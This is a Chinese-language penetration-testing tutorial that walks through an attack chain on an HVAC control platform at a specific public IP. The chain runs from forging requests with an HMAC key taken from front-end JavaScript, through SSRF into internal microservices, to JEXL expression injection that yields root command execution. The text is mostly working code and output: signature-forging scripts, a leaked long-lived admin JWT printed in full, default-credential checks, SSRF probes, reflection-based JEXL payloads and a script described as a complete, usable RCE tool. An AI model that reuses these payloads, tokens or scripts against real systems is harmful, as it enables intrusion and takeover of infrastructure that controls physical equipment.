### 0.2 三个必须刻进骨子里的原则

**原则一：先查库，别重复劳动**

真正的红队作业里，你往往是接力者。动手前花 30 秒确认：

```bash
# 有没有人打过这台？打到什么程度？
# 有没有现成的 webshell / 隧道 / 凭据？
# 这个漏洞是不是已经被标成 exploited 了？
```

本文所有步骤都有落库记录（攻击链 78 步、漏洞 30 条、凭据 25 条）。**没落库的发现 = 没发生**，因为报告里写不出来。

**原则二：能只读就不写，能少写就少写**

本次作业的红线是「不破坏原本业务进程」。这不是形式主义 —— 生产环境里误改一个配置，可能让几百台设备的空调失控。具体做法：

- SQL 只用 `SELECT` / `SHOW`，绝不 `UPDATE` / `DELETE` / `DROP`
- 改 nginx 配置前先 `cp` 备份，改完 `nginx -t` 验证，再 `reload`（不是 `restart`）
- 需要写文件时用**新文件名**，用完删除
- 不碰 `POST /api/definitions`（会覆盖整个 RabbitMQ 配置）

**原则三：卡住了就换维度，不要硬撞**

本次最关键的一次突破，就是「换维度」：

> 上一轮卡在「文件上传落到内网 MinIO，公网读不回来 → 没有 webshell → 没有隧道」。  
> 第二轮不找「文件读取」，改找「**平台主动发起 HTTP 请求**」的接口 —— 于是拿到 SSRF，一路通到 root。

**当一条路走不通时，问自己：这个系统还有什么「主动行为」我没利用？** 发请求、执行表达式、连数据库、写日志、发消息……每一个都是潜在入口。

### 0.3 认识目标：我们面对的是什么

先建立一个正确的心智模型。`140.210.34.87` 上跑的是：

```bash
nmap -sV -sC -p- --min-rate 2000 -T4 140.210.34.87 -oN nmap_full.txt
```

结果（关键部分）：

### 1.2 关键动作：被动指纹，不做任何攻击性请求

**新手常犯的错**：一上来就跑 `nuclei` 全量模板、`nikto`、`sqlmap`，结果被 WAF 封掉，后面什么都做不了。

正确做法是**只发 GET，不加任何 payload**，先看清对方是什么：

```bash
# 看首页 title + Server 头
curl -sk -m 10 -D- -o /tmp/body.html http://140.210.34.87:8001/
grep -oP '(?<=<title>)[^<]+' /tmp/body.html
```

回显：

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Content-Type: text/html

<title>CPS空调智能平台</title>   ← 注意：这个 title 是 JS 动态设的
```

继续挖前端资源，找框架和接口线索：

```bash
# 看首页引用了哪些 JS
grep -oP 'src=[^ >]+' /tmp/body.html
```

输出里有一条很关键：

```html
<script src=/static/js/app.18ad67ec.js></script>
<script src=/static/js/chunk-vendors.71477dab.js></script>
```

**这是 Vue SPA 的典型特征**（`app.[hash].js` + `chunk-vendors.[hash].js`）。对 SPA 来说，**前端 JS 就是源码**，所有接口路径、参数格式、甚至密钥都可能藏在里面。

### 1.3 顺着前端 JS 找 API 全貌

```bash
curl -s http://140.210.34.87:8001/static/js/app.18ad67ec.js -o app.js
wc -c app.js
```

```bash
# 找 API 前缀
grep -oE '"/[a-z-]+/[a-z-]+/' app.js | sort -u | head -30
```

发现关键前缀：`/gateway/intelctrl-user/`、`/gateway/intelctrl-dev-manage/`

```bash
# 找接口路径（Vue 里通常是 o("/path") 或 url:"/path" 形式）
grep -oE 'o\("(/[^"]{2,70})"' app.js | head -20
```

### 1.4 挖出签名逻辑（本章最重要的收获）

```bash
grep -nE "Signature|HMAC|SignatureNonce|SignatureMethod" app.js | head -20
```

在混淆代码里找到类似这样的逻辑：

```javascript
// 还原后的伪代码
var nonce = randomString(18);
var ts = Date.now();
var msg = "PC#HMAC-SHA1#1.0#" + nonce + "#PC#" + ts + "#VECK-UAT";
var sig = base64(HmacSHA1(msg, "PC&VECK-UAT"));
headers = {
  token: "...",
  Timestamp: ts,
  Platform: "PC",
  From: "VECK-UAT",
  SignatureMethod: "HMAC-SHA1",
  SignatureVersion: "1.0",
  SignatureNonce: nonce,
  Signature: sig,
  Lang: "zh-cn"
};
```

**这就是「自研签名机制」的经典形态**：把 key 硬编码在前端。看到这种结构，你就知道：**签名校验对我们完全无效**，因为我们能算出合法签名。

### 1.5 验证签名绕过是否成功

**判断标准很重要**：不能看 HTTP 状态码，要看**业务错误码变化**。

```bash
# 不带签名
curl -s "http://140.210.34.87:8001/gateway/intelctrl-user/api/users/info"
# 预期：{"msg":"无效的签名","err_code":xxxx}

# 带正确签名
python3 sign_probe.py
# 预期：{"msg":"未认证","err_code":91004401}
```

从「**无效的签名**」变成「**未认证**」，说明**签名这关已经过了**，现在只是没登录。这是一个巨大的进展 —— 意味着 1734 条接口全部向我们敞开，剩下只差一个 token。

### 1.6 顺便扫一遍中间件（低成本高回报）

```bash
# Redis 未授权？——单条 PING，最轻的探测
printf 'PING\r\n' | timeout 5 nc -w4 140.210.34.87 6379

# RabbitMQ 管理台默认口令？（只试 1 次，不爆破）
curl -s -u guest:guest http://140.210.34.87:15672/api/whoami
curl -s -u admin:admin http://140.210.34.87:15672/api/whoami
```

本次结果：

- Redis 6379 未开放（后来发现只在 docker 网络内）
- RabbitMQ `guest/guest` → 401
- RabbitMQ `admin/admin` → **`{"name":"admin","tags":["administrator"]}`** ← 中了！

**注意**：`admin/admin` 只试了 **1 次**。这不是爆破，是「默认凭据尝试」。区别在于：爆破会试几百上千次，会锁账号、会触发告警；默认凭据尝试只试业界公认的几个（admin/admin、root/root、test/test），命中率不低且风险极小。

## 第 2 章：第一个突破口 —— 逆向 HMAC 签名绕过网关

> 本章把 1.4 节发现的算法写成可用代码。**这是整个渗透的钥匙，务必理解透。**

### 2.1 签名算法完整还原

```python
import base64, hashlib, hmac, time, random, string

SIGN_KEY = "PC&VECK-UAT"      # 从 app.js 提取
FROM = "VECK-UAT"

def sign(nonce, ts):
    # 拼接顺序：Platform#SignatureMethod#SignatureVersion#Nonce#Platform#Timestamp#From
    msg = "PC#HMAC-SHA1#1.0#%s#PC#%s#%s" % (nonce, ts, FROM)
    digest = hmac.new(SIGN_KEY.encode(), msg.encode(), hashlib.sha1).digest()
    return base64.b64encode(digest).decode()

def headers(with_token=True):
    ts = str(int(time.time() * 1000))          # 毫秒时间戳
    nonce = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(18))
    h = {
        "Timestamp": ts,
        "Platform": "PC",
        "From": FROM,
        "SignatureMethod": "HMAC-SHA1",
        "SignatureVersion": "1.0",
        "SignatureNonce": nonce,
        "Signature": sign(nonce, ts),
        "Lang": "zh-cn",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 ...",
    }
    if with_token:
        h["token"] = JWT
    return h
```

### 2.2 三个容易搞错的细节

**细节一：`From` 和 key 是联动的**

```
From: VECK-UAT  →  key = PC&VECK-UAT
From: HJL-UAT   →  key = PC&HJL-UAT
```

看 swagger 里 `From` 字段的 `default` 值就知道该用哪个。本次环境的 swagger 里写的是 `HJL-UAT`，但实测用 `VECK-UAT` 才能过 —— 说明**前端用的是 VECK-UAT**。这种不一致只能靠试出来。

**细节二：时间戳是毫秒，不是秒**

```python
ts = str(int(time.time() * 1000))   # 对
ts = str(int(time.time()))          # 错，会签名失败
```

**细节三：好消息 —— 时间和 nonce 都不校验**

从后来读到的 Nacos 配置里证实了这一点：

```yaml
intelctrl:
    sign:
        timestamp-limit: -1   # -1 = 不作限制（时间戳可以随便写）
        nonce-time: -1        # -1 = 不作限制（nonce 可以重复用）
```

所以你可以把 `Timestamp` 写死成任意值，`SignatureNonce` 也可以固定 —— 极大简化脚本。**但要注意：这是这个环境的配置，别的环境可能开了校验。**

### 2.3 完整请求封装

```python
import urllib.request, urllib.error, json

BASE = "http://140.210.34.87:8001"

def req(path, method="GET", data=None, timeout=45, extra=None):
    h = headers()
    if extra:
        h.update(extra)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR:%r" % (e,)
```

**验证签名绕过成功**：

```python
s, b = req("/gateway/intelctrl-user/v2/api-docs")
print(s, len(b))
# 期望：200 737020   ← 拿到了 737KB 的 swagger
```

## 第 3 章：白捡的超管 —— swagger 里的硬编码 JWT

### 3.1 为什么先看 swagger

签名过了之后，第一件事不是瞎试接口，而是**把接口文档全下载下来**。理由：

1. 知道有哪些接口 → 不用猜路径
2. 知道参数名和类型 → 构造请求不会错
3. **swagger 里经常有「示例值」，而示例值经常是真实凭据**

### 3.2 下载三个微服务的 swagger


```bash
curl -s "http://140.210.34.87:8001/gateway/intelctrl-user/v2/api-docs" -o user.json
curl -s "http://140.210.34.87:8001/gateway/intelctrl-dev-manage/v2/api-docs" -o dev.json
```

大小：`user.json` 737KB（328 条接口），`dev.json` 3.38MB（1418 条接口）。

### 3.3 关键发现：token header 的 default 值

```bash
grep -oP '"name":"token".{0,400}?"default":"[^"]+"' dev.json | head -1
```

输出（格式化后）：

```json
{
  "name": "token",
  "in": "header",
  "description": "登录校验",
  "required": true,
  "type": "string",
  "default": "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTExLCJ0eXBlIjoyLCJleHAiOjQ5MzUzNDU4MDR9.XSOh9kU82jGweATt8OJmsj_ncGsZh4yKYb79uGCMqP8"
}
```

**这就是一个真实的 JWT，被写死在 swagger 的示例值里。**

### 3.4 解码看看它是什么

```bash
python3 -c "
import base64, json
t = 'eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTExLCJ0eXBlIjoyLCJleHAiOjQ5MzUzNDU4MDR9.XSOh9kU82jGweATt8OJmsj_ncGsZh4yKYb79uGCMqP8'
p = t.split('.')[1]; p += '=' * (4 - len(p) % 4)
print(json.loads(base64.urlsafe_b64decode(p)))
"
```

输出：

```python
{'id': 111, 'type': 2, 'exp': 4935345804}
```

**三个关键信息**：

- `id: 111` —— 用户 ID 111
- `type: 2` —— 类型 2（管理员类型）
- `exp: 4935345804` —— **过期时间戳 4935345804 = 2126 年**！

也就是说，这枚 token **有效期 100 年**。

### 3.5 用它读超管档案

### 3.6 这一课教会我们什么

**教训一：swagger 是信息泄露的重灾区**

很多团队觉得「swagger 是给开发看的，方便」，于是：

- 生产环境不关 swagger
- 示例值直接填真实的 token / 手机号 / 密码
- 更有甚者，把内部 IP、AK/SK 写进 description

**实战检查清单**：

```bash
# 1. swagger 是否暴露
for p in /v2/api-docs /swagger-resources /swagger-ui.html /api-docs /openapi.json /doc.html; do
  echo -n "$p -> "; curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET$p"
done

# 2. 里面有没有凭据
grep -oiE '(default|example)":\s*"[^"]{20,}"' api-docs.json | grep -iE 'eyJ|token|key|secret|password'
```

**教训二：JWT 的 exp 到 2126 年，说明签发时就没打算让它过期**

这是个设计缺陷：为了方便测试，把过期时间设得极长，然后忘了改。实战中看到 `exp` 特别大的 JWT，直接拿去用。

**教训三：`superFlag` + `entId: -1` 是最高权限的标志**

很多多租户系统用 `entId` 区分企业，`-1` 通常代表「平台级/超管」。看到这个组合，说明你拿到了整个平台的最高权限，不是某个租户。

## 第 4 章：从 1418 条接口里挖 SSRF

> 这是本次渗透的**转折点**。上一轮卡在「有 root JWT 但拿不到服务器权限」，本章通过系统性方法找到了通往内网的桥。

### 4.1 上一轮的困境（值得学习）

**已有什么**：root JWT（可读全平台数据）、MQTT admin/admin（可订阅全部设备消息）、文件上传接口（不校验后缀，jsp/php 都能传）

**卡在哪里**：

```
上传的 jsp 落到内网 MinIO 192.168.3.115:9090
  ↓
MinIO 是对象存储，不解析 jsp（不是 web 容器）
  ↓
公网 9090 端口关闭，且 /dev/dossier/list 和 /filedownLoad 都读不回来
  ↓
没有 webshell → 没有隧道 → 拿不到 server-host
```

**新手常见的死磕方式**：继续找「怎么把文件读回来」。试了 10 个下载接口、5 种路径穿越、3 个协议包装器……全失败。

**正确的思路切换**：不再找「文件读取」，改找「**平台主动发起 HTTP 请求**」的接口 —— 这就是 SSRF。SSRF 能做什么？

- 读内网 HTTP 服务的响应（相当于一个「内网浏览器」）
- 探测内网端口
- 如果支持协议（gopher/dict/file）还能打更多

**而且 SSRF 有一个文件上传比不了的优势**：它能拿到内网服务的**错误信息**。错误信息里经常藏着技术栈细节（框架、版本、甚至表达式引擎）—— 这正是后面找到 JEXL 的关键。

### 4.2 系统性找 SSRF sink 的方法（重点）

不要靠猜。用「**schema 属性名匹配**」这个方法，可以覆盖全部接口：

```python
#!/usr/bin/env python3
# scan_defs.py —— 遍历 swagger definitions，找所有像 SSRF 落点的字段
import json, os

# SSRF 落点常见的字段名关键词
WANT = ("url", "uri", "host", "ip", "port", "addr", "address", "domain", "link",
        "path", "file", "filename", "filepath", "src", "target", "endpoint", "server")

for fn in ["user.json", "dev.json"]:
    d = json.load(open(fn, encoding="utf-8"))
    defs = d.get("definitions") or {}
    paths = d.get("paths") or {}

    # 第一步：找出哪些 schema 有可疑字段
    susp = {}
    for name, sch in defs.items():
        props = (sch or {}).get("properties") or {}
        hits = [p for p in props if any(w in p.lower() for w in WANT)]
        if hits:
            susp[name] = hits

    # 第二步：反查这些 schema 被哪些接口使用
    for name, hits in sorted(susp.items()):
        users = []
        for p, v in paths.items():
            if '"#/definitions/%s"' % name in json.dumps(v):
                for m in v:
                    if isinstance(v[m], dict):
                        users.append("%s %s" % (m.upper(), p))
        if users:
            print("\nSCHEMA %s  props=%s" % (name, hits))
            for u in users[:6]:
                print("   used by", u)
```

**运行结果**：命中 152 个 schema。其中一条特别可疑：

```
SCHEMA 自定义API信息  props=['apiEncoding', 'apiMethod', 'apiUrl', 'id']
   used by POST /alogrithm/unit/advenced/api
```

`apiUrl` + `apiMethod` + `apiEncoding` —— 这三个字段凑在一起，就&#x662F;**「服务端帮你发一个 HTTP 请求」**&#x7684;标准配置。

### 4.3 验证 SSRF 是否成立（必须做对照组）

**这一步非常重要**：新手经常误判 SSRF。有些接口只是「把 URL 存起来」，并不真的发请求；有些会发请求但不返回响应。必须做**对照组实验**才能确认。

```python
#!/usr/bin/env python3
# t_api_ssrf.py
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from veck import req

P = "/gateway/intelctrl-dev-manage/alogrithm/unit/advenced/api"

TARGETS = [
    "http://192.168.3.115:9100/actuator",        # 内网已知服务
    "http://192.168.3.115:9100/actuator/health", # 内网已知服务
    "http://192.168.3.115:9100/nope404",         # 内网 404（对照组）
    "http://192.168.3.115:1/",                   # 关闭的端口（对照组）
    "http://10.0.0.1/",                          # 不可达网段（对照组）
]

for url in TARGETS:
    body = {
        "apiFormula": {"apiUrl": url, "apiMethod": "GET", "apiEncoding": "UTF-8"},
        "apiHeaders": [], "apiParams": [], "apiResponses": [],
    }
    s, b, h = req(P, method="POST", data=body, timeout=30)
    print("apiUrl =", url)
    print("  ->", s, (b if isinstance(b, str) else str(b))[:300])
    print()
```

**结果分析（这就是「对照组」的价值）**：

| apiUrl                  | 响应                       | 说明                  |
| ----------------------- | ------------------------ | ------------------- |
| `:9100/actuator`        | 完整 `_links` JSON（366 字节） | **真的读到了内网内容**       |
| `:9100/actuator/health` | `{"status":"UP"}`        | **真的读到了内网内容**       |
| `:9100/nope404`         | `data:null`              | 404 被过滤（不报错，只是空）    |
| `:1/`                   | `data:null`              | 端口关闭                |
| `10.0.0.1`              | 25 秒客户端超时                | **真实网络请求，不可达网段会挂起** |

**三条铁证**：

1. 能读到内网真实内容（不是本地字符串拼接）
2. 404 和关闭端口返回 null，说明是真实的 HTTP 交互
3. 不可达网段会挂起 25 秒 —— 如果是假的，会立刻返回

### 4.4 SSRF 的响应回显规则（必须搞清）

第一轮我以为「只能回显 JSON」，这个判断**错了**。实际规则是：

| 情况                             | 是否回显                        |
| ------------------------------ | --------------------------- |
| HTTP 200 + Content-Type 是 JSON | ✅ 原样回显                      |
| HTTP 200 + Content-Type 是 HTML | ✅ 回显（但需要 Accept 头配合，见第 5 章） |
| HTTP 4xx/5xx                   | ❌ 返回 null                   |
| 端口关闭                           | ❌ 返回 null                   |
| 网络不可达                          | ⏱ 客户端超时                     |

**这个规则决定了你能读什么、不能读什么。** 所以后续探测内网时，看到 `data:null` 不代表「没有这个服务」，可能是「这个服务返回了非 200」。

### 4.5 用 SSRF 扫内网

```python
#!/usr/bin/env python3
# ssrf_scan.py —— 用 SSRF 扫内网端口
```

## 第 5 章：SSRF 进阶 —— apiHeaders 注入 + 横向拉出 7 个微服务

> 本章是「把 SSRF 从玩具变成武器」的关键。核心发现：**`apiHeaders` 参数能注入任意请求头**。

### 5.1 从 401 到 200 的突破

内网微服务全返回 `invalid token`。怎么办？

**第一反应**：把 root JWT 塞进去。但 `apiUrl` 只是个 URL，怎么带 header？

**关键洞察**：回头看那个 schema ——

```
SCHEMA 自定义API信息  props=['apiEncoding', 'apiMethod', 'apiUrl', 'id']
SCHEMA ApiHeaders      props=['headerParam', 'headerType', 'headerValue', 'id']
```

`ApiHeaders` 有 `headerParam` / `headerValue`！也就是说，**这个接口支持自定义请求头**。

```python
body = {
    "apiFormula": {"apiUrl": "http://192.168.3.115:9101/actuator/env",
                   "apiMethod": "GET", "apiEncoding": "UTF-8"},
    "apiHeaders": [
        {"headerParam": "token", "headerType": 4, "headerValue": JWT}
    ],
    "apiParams": [], "apiResponses": [],
}
```

**`headerType` 的含义**（从 swagger description 读到）：

- `4` = 自定义 header（值直接就是 headerValue）
- `5` = 全局变量（从服务端配置取值）

**结果对比**：

```
注入前: {"data":{"msg":"invalid token","err_code":401,"status":200}}
注入后: {"status":200,"err_code":0,"data":null}      ← 401 消失了，说明认证通过
```

虽然返回 `null`（因为 actuator/env 本身可能没数据），但 **401 消失就是认证成功的铁证**。

### 5.2 第二个突破：Accept 头让 swagger 吐出来

试 `/v2/api-docs` 还是 `null`。为什么？

**因为 swagger 的 `/v2/api-docs` 会看 `Accept` 头决定返回格式**。默认的 Accept 可能不被识别。

```python
body = {
    "apiFormula": {"apiUrl": "http://192.168.3.115:9104/v2/api-docs",
                   "apiMethod": "GET", "apiEncoding": "UTF-8"},
    "apiHeaders": [
        {"headerParam": "Accept", "headerType": 4, "headerValue": "application/json"}
    ],
    "apiParams": [], "apiResponses": [],
}
```

**结果**：

```
无 Accept 头: 200  len=39    {"status":200,"err_code":0,"data":null}
加 Accept 头: 200  len=261221 {"basePath":"/","paths":{"/api/work-order/warn-statistics":{...
```

**从 39 字节变成 261KB！** 这就是「Accept 头」的威力。

### 5.3 一次性拉出全部内网微服务

```python
#!/usr/bin/env python3
# pull_inner.py —— 经 SSRF 拉全部内网 swagger
import sys, os, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from veck import req, JWT

P = "/gateway/intelctrl-dev-manage/alogrithm/unit/advenced/api"
ACC = [{"headerParam": "Accept", "headerType": 4, "headerValue": "application/json"}]

def probe(url, headers=None, timeout=60):
    body = {
        "apiFormula": {"apiUrl": url, "apiMethod": "GET", "apiEncoding": "UTF-8"},
        "apiHeaders": headers if headers is not None else ACC,
        "apiParams": [], "apiResponses": [],
    }
    s, b, h = req(P, method="POST", data=body, timeout=timeout)
    return s, (b if isinstance(b, str) else str(b))

def unwrap(txt):
    """内层可能有 {data:{data:{...}}} 的嵌套，需要剥开"""
    try:
        o = json.loads(txt)
    except Exception:
        return None
    d = o.get("data")
    if isinstance(d, dict) and "data" in d and isinstance(d["data"], (dict, list)):
        d = d["data"]
    return d

for port in [9100, 9101, 9104, 9105, 9106, 9110, 9111, 9117]:
    s, t = probe("http://192.168.3.115:%d/v2/api-docs" % port)
    d = unwrap(t)
    n = len((d or {}).get("paths") or {}) if isinstance(d, dict) else 0
    print("port %-5d %s len=%-8d paths=%d" % (port, s, len(t), n))
    if n:
        json.dump(d, open("inner_%d.json" % port, "w", encoding="utf-8"), ensure_ascii=False)
```


**结果（这是本轮最重要的收获）**：

```
port 9100   200 len=39       paths=0     （只有 actuator）
port 9101   200 len=737041   paths=297   （intelctrl-user）
port 9104   200 len=261221   paths=93    （intelctrl-work-order）
port 9105   200 len=391911   paths=148   （intelctrl-product-library）
port 9106   200 len=3381010  paths=1289  （intelctrl-dev-manage）
port 9110   200 len=30486    paths=13    （intelctrl-calculation）★
port 9111   200 len=44340    paths=22    （intelctrl-analysis）
port 9117   200 len=68243    paths=34    （公式/指令服务）
```

**合计 1896 条内网接口**。这就是「横向」的真正含义 —— 不是端口通了，而是**能读到内网服务的完整接口文档**。

### 5.4 为什么这一步价值巨大

有了内网 swagger，你能：

1. **知道内网有哪些功能是公网没有的**（比如 9110 的算法执行接口）
2. **看到内网服务的内部调用方式**（`/feign/...` 系列，绕过网关直接调）
3. **发现隐藏的技术栈线索**（第 6 章就是靠这个找到 JEXL 的）

**新手提示**：很多人拿到 SSRF 就只用来「扫端口」，太浪费了。SSRF 的真正价值是「**把内网服务当成本地服务来读**」—— 读它的 swagger、读它的 actuator、读它的配置。

## 第 6 章：从 SSRF 到 root —— JEXL 表达式注入

> 本章是核心。从「一个报错信息」到「root 命令执行」，全程只用了 5 个 HTTP 请求。

### 6.1 决定性的一条报错

在 9110（calculation 计算服务）的 swagger 里发现一个接口：

```
GET /feign/calc-unit/test-unit   params=['deviceId', 'modelId']   测试计算单元
```

经 SSRF 调用：

```python
body = {
    "apiFormula": {"apiUrl": "http://192.168.3.115:9110/feign/calc-unit/test-unit?deviceId=1&modelId=1",
                   "apiMethod": "GET", "apiEncoding": "UTF-8"},
    "apiHeaders": [], "apiParams": [], "apiResponses": [],
}
```

**返回**：

```json
{"status":200,"err_code":0,"data":{"datas":[{
  "endSaveName":"机组1冷冻侧进出水温度差大于8res",
  "outputIdentify":"DALP4R",
  "data":null,
  "endName":"机组1冷冻侧进出水温度差大于8",
  "error":"com.veckchina.intelctrl.calculation.calcuint.core.impl.LocalUnitContainer.load:151 JEXL error : now",
  ...
```

**`JEXL error`** —— 这三个字是整个渗透的关键。

### 6.2 JEXL 是什么，为什么它危险

**Apache Commons JEXL** 是一个 Java 表达式引擎，用来做「公式计算」。比如：

```java
// 业务里用 JEXL 算「冷冻侧进出水温度差」
(unit2DA7522 - unit1DASJGK) > 8
```

**危险点在于**：JEXL 默认**没有沙箱**。它能访问任意 Java 类，包括 `java.lang.Runtime`。这意味着：

```
能写 JEXL 表达式 = 能执行任意 Java 代码 = 能执行任意系统命令
```

**为什么这个报错会漏出来**：开发把 `error.getMessage()` 直接返回给前端了，而这行报错里带了类名和行号。这是典型的「**错误信息泄露技术栈**」。

**新手要养成的习惯**：看到报错信息，逐字读。类名、包名、行号、框架名 —— 每一个都是情报。

| 报错特征                        | 能推断出什么                           |
| --------------------------- | -------------------------------- |
| `JEXL error`                | Apache Commons JEXL 表达式引擎        |
| `OGNL`                      | Struts2 / WebWork（可能有 S2 系列 RCE） |
| `SpEL` / `EL1007E`          | Spring Expression Language       |
| `Velocity` / `Freemarker`   | 模板引擎 SSTI                        |
| `com.alibaba.fastjson`      | fastjson 反序列化                    |
| `pickle data was truncated` | Python pickle 反序列化               |

### 6.3 找到「写表达式」的入口

现在知道了 9110 会执行 JEXL，但**怎么把表达式写进去**？

**思路**：9110 是「计算服务」，它执行的公式一定存在数据库里，由某个「保存公式」的接口写入。这个接口应该在公网的 8001 上（因为运营人员要在网页上编辑公式）。

在公网 swagger 里搜「算法单元」：

```bash
grep -oE '"/alogrithm/unit[^"]*"' paths_dev.txt | sort -u
```

```
/alogrithm/unit               ← POST 新增 / PUT 编辑 / GET 查看 / DELETE 删除
/alogrithm/unit/advenced      ← 运行(校验)高级算法单元
/alogrithm/unit/advenced/api  ← 运行(校验)API算法单元（就是我们挖 SSRF 的那个）
/alogrithm/unit/test-unit     ← 组态算法模型接口
```

看 `/alogrithm/unit` 的 POST schema：

```json
{
  "calculateFormula": "原始计算公式",     ← 关键字段！
  "calculateType": "计算类型(1四则运算 2逻辑运算 3设备计算 4数据统计 5自定义API)",
  "conditionList": "算法单元条件公式的集合",
  "modelId": "模型ID",
  "unitName": "单元名称",
  ...
}
```

**`calculateFormula` = "原始计算公式"** —— 这就是 JEXL 表达式的入口。

### 6.4 第一个坑：字段传了但没生效

按直觉构造请求：

```python
body = {
    "calculateFormula": "1+2+3",     # 直接放这里
    "calculateType": 1,
    "outputType": 3,
    "unitName": "test",
    "modelId": 1,
    "conditionList": [],
}
s, b = req("/gateway/intelctrl-dev-manage/alogrithm/unit", method="POST", data=body)
# -> {"status":200,"err_code":0,"data":9002}   新建成功，id=9002
```

读回来验证：

```python
s, b = req("/gateway/intelctrl-dev-manage/alogrithm/unit?id=9002")
# -> "calculateFormula": null      ← 空的！没生效
```

**为什么**：`calculateFormula` 只是个「展示用」的字段，服务端不读它。真正被持久化的是 `conditionList` 里的结构化数据。

**看一个真实单元的完整结构**（`GET /alogrithm/unit?id=3`）：

```json
{
  "id": 3,
  "calculateFormula": "(unit2DA7522-unit1DASJGK)>8",
  "conditionList": [
    {
      "conditionFormula": null,
      "calculateFormula": [
        {"type": 2, "value": {"paramName": "(", "symbolType": 1}},
        {"type": 1, "value": {"paramType": 3, "paramId": 2, "paramName": "机组1冷冻侧出水温度"}},
        {"type": 2, "value": {"paramName": "-", "symbolType": 1}},
        {"type": 1, "value": {"paramType": 3, "paramId": 1, "paramName": "机组1冷冻侧进水温度"}},
        {"type": 2, "value": {"paramName": ")", "symbolType": 1}},
        {"type": 2, "value": {"paramName": ">", "symbolType": 1}},
        ...
      ]
    }
  ]
}
```

**看懂了这个结构，就明白怎么注入了**：

- `type: 1` = 引用一个参数（paramId 指向某个设备属性）
- `type: 2` = 一个「符号/字面量」（`(`、`)`、`-`、`>` 等）

而 `type: 2` 的 `paramName` 是**原样拼进公式字符串的**！所以：

```json
{"type": 2, "value": {"paramName": "<这里放任意 JEXL 表达式>", "symbolType": 1}}
```

### 6.5 第二个坑：JEXL 不支持 `new`

第一个想法是用经典的 Java 命令执行链：

```java
new java.io.BufferedReader(new java.io.InputStreamReader(
    Runtime.getRuntime().exec("id").getInputStream())).readLine()
```

**结果**：

```json
{"error":"...@1:17 parsing error in 'new'"}
```

**JEXL 不支持 `new` 关键字**。这是新手最容易卡住的地方 —— 网上抄的 payload 全部失效。

**解法**：用 `getClass().forName()` 反射拿类，完全避开 `new`：

```java
"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

拆解：

- `"".getClass()` → 拿到 `String` 的 Class 对象
- `.forName("java.lang.Runtime")` → 反射加载 Runtime 类
- `.getRuntime()` → 拿 Runtime 单例
- `.exec("id")` → 执行命令

### 6.6 逐步验证（每一步都确认，不要跳）

**Step 1：确认 JEXL 能求值（算术）**

```
paramName = "1+1"
→ 响应 data = "2"
```

**Step 2：确认能调 System（读属性）**

```
paramName = """.getClass().forName("java.lang.System").getProperty("user.name")"""
→ 响应 data = "root"        ← 已经是 root 了！
```

**Step 3：确认 OS 和 Java 版本**

```
paramName = """.getClass().forName("java.lang.System").getProperty("os.name")"""
→ data = "Linux"

paramName = """.getClass().forName("java.lang.System").getProperty("java.version")"""
→ data = "1.8.0_362"
```

**Step 4：执行命令并取回显**

命令执行有个坑：`exec()` 返回的是 `Process` 对象，不是输出。而且 **`exec(String)` 会按空格切分参数**，所以复杂命令要包成脚本。

**方案 A（简单命令）**：重定向到文件，再用 `Files.readAllLines` 读回

```java
// 执行
"".getClass().forName("java.lang.Runtime").getRuntime().exec("sh -c id>/tmp/zzz_rce.txt").waitFor()
→ data = "0"     // waitFor() 返回退出码

// 读回
"".getClass().forName("java.nio.file.Files").readAllLines(
    "".getClass().forName("java.nio.file.Paths").get("/tmp/zzz_rce.txt")).toString()
→ data = "[uid=0(root) gid=0(root) 组=0(root) 上下文=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023]"
```

**`uid=0(root)` —— root 到手。**

**方案 B（复杂命令）**：写脚本再执行（推荐，因为能写任意多行）

```python
# 1. 用 base64 把脚本内容写进目标文件（避免 JEXL 字符串转义的坑）
import base64
script = "#!/bin/sh\nid; hostname; uname -a\n"
b64 = base64.b64encode(script.encode()).decode()

expr = ('"".getClass().forName("java.nio.file.Files").write('
        '"".getClass().forName("java.nio.file.Paths").get("/tmp/zzz_s.sh"), '
        '"".getClass().forName("java.nio.file.Paths").get("/tmp/zzz_s.sh").getClass()'
        '.forName("java.util.Base64").getDecoder().decode("%s"))' % b64)

# 2. chmod +x
# 3. 执行脚本，输出重定向到文件
# 4. 读回文件
```

**为什么用 base64**：JEXL 的字符串分词器对特殊字符很敏感。直接写带引号、换行、`$` 的字符串会报 `tokenization error`。base64 只含字母数字 `+/=`，绝对不会出问题。

### 6.7 完整的 RCE 脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""intelctrl JEXL RCE —— 完整可用版本"""
import base64, json, time, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from veck import req, JWT

B = "/gateway/intelctrl-dev-manage"
UID = 9002              # 自建的单元 id
UNIT = "zzz_probe_add_1"

RT    = '"".getClass().forName("java.lang.Runtime").getRuntime()'
FILES = '"".getClass().forName("java.nio.file.Files")'
PATHS = '"".getClass().forName("java.nio.file.Paths")'

def _tok(text, sid=99):
    """构造 conditionList 里的一个 type=2 token"""
    return {"type": 2, "value": {
        "id": sid, "paramType": None, "paramId": None, "responseId": None,
        "responseField": None, "responseName": None, "paramName": text,
        "attributeType": "Latest", "pointTime": None, "identify": None,
        "setType": None, "setValue": None, "setName": None, "timeOperator": None,
        "timeRange": None, "timeUnit": None, "bindName": None, "bindType": None,
        "bindValue": None, "edit": 0, "symbolType": 1}}

def _set(expr):
    """把 JEXL 表达式写进单元"""
    body = {
        "id": UID, "calculateFormula": None, "calculateType": 1, "outputType": 3,
        "digits": 0, "unitName": UNIT, "modelId": 1,
        "modelKey": "17617091349109ZM93", "loc": "9000 9000", "text": "probe",
        "outputObj": 1,
